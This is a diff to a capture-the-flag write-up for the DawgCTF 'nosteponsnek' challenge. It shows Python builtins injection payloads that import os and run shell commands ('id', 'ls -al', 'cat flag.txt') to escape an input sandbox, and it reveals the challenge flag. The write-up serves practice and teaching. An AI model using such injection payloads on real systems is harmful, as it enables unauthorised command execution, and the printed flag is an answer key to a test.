@@ -16,26 +16,26 @@ Let's try if we can use some python [builtins](https://docs.python.org/3.9/libra
 ```python
 __builtins__.help()
 ```
-![help](src/nosteponsnek_help)
+![help](src/nosteponsnek_help.png)
 We can definitely use builtins!!!
 
 Use following for PoC:
 ```python
 __builtins__.__import__("os").system("id")
 ```
-![poc](src/nosteponsnek_poc)
+![poc](src/nosteponsnek_poc.png)
 
 Now we just need to find the flag and read it, listing can help us.
 ```python
 __builtins__.__import__("os").system("ls -al")
 ```
-![ls](src/nosteponsnek_ls)
+![ls](src/nosteponsnek_ls.png)
 
 Such a luck!
 ```python
 __builtins__.__import__("os").system("cat flag.txt")
 ```
-![flag](src/nosteponsnek_flag)
+![flag](src/nosteponsnek_flag.png)
 
 We've successfully captured the flag!! ``DawgCTF{bUt_iT'5_c@ll3d_1nput}``
 
